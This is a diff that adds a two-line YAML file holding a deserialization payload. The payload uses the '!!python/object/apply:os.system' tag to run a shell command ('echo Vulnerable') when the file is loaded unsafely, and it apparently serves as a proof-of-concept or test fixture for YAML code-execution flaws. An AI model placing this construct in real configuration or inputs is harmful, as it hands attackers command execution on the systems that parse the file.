@@ -1,0 +1,2 @@
+key: !!python/object/apply:os.system
+args: ['echo Vulnerable']
